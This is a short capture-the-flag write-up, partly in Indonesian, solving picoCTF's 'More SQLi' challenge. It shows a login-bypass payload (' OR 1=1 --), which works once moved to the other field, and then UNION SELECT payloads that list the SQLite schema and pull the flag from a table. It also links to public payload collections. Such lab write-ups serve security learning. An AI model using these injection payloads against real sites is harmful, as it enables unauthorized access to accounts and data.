# More SQLi (picoCTF)

<img src="./img/2-soal.png">

## Reference

- https://github.com/payloadbox/sql-injection-payload-list
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## Steps

1. Launch instance terlebih dahulu, ketika dibuka muncul login page. Saya mencoba inject dengan beberapa payload. Disini saya menggunakan `' OR 1=1 --` dengan password bebas.

<img src="./img/2-loginpage.png">

<img src="./img/2-outputlogin.png">

disini terlihat query SQL nya terbalik, sehingga hanya perlu untuk menukar inputnya

<img src="./img/2-loginsuccess.png">
login berhasil
<img src="./img/2-landingpage.png">

2. Setelah itu, kita akan mencoba beberapa payload untuk mencoba mendapatkan flag.

- `' UNION SELECT NULL,NULL,NULL --`
  <img src="./img/2-null.png">

- `' UNION SELECT name,sql,NULL from sqlite_master;--`
  <img src="./img/2-name,sql.png">

- `' UNION SELECT flag,NULL,NULL from more_table;--`
  <img src="./img/2-flag.png">
